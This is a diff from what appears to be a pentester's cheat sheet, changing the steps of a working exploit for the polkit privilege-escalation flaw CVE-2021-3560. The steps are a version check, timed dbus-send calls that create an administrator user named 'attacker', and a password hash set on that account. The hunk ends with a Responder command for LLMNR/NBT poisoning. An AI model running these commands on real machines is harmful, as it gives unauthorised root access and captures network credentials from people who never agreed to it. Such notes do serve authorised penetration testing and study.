@@ -196,11 +196,11 @@ polkit - https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
 1) Check for policykit-1 version 0.105-26ubuntu1.1
 apt list --installed | grep policykit-1
 2) send dbus message -
-dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"adm_paul" int32:1 & sleep 0.005s; kill $!
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"pen test" int32:1 & sleep 0.005s; kill $!
 3) Get a password hash
 openssl passwd -6 Expl01ted
 4) Set the user password using a dbus message
-dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$lasTe./Dfsc3nojs$8nPe0b5.u8gAkjY1Et2nFDylUTR4uBK/4MyqW30Q0Z6ZSdTNKObxcgZhu0NAzQS1ysNmc1aETDWpzcFX.hwuS/' string:'Ask the pentester' & sleep 0.005s; kill $!
 ```
 # LLMNR/NBT
 responder -I eth0
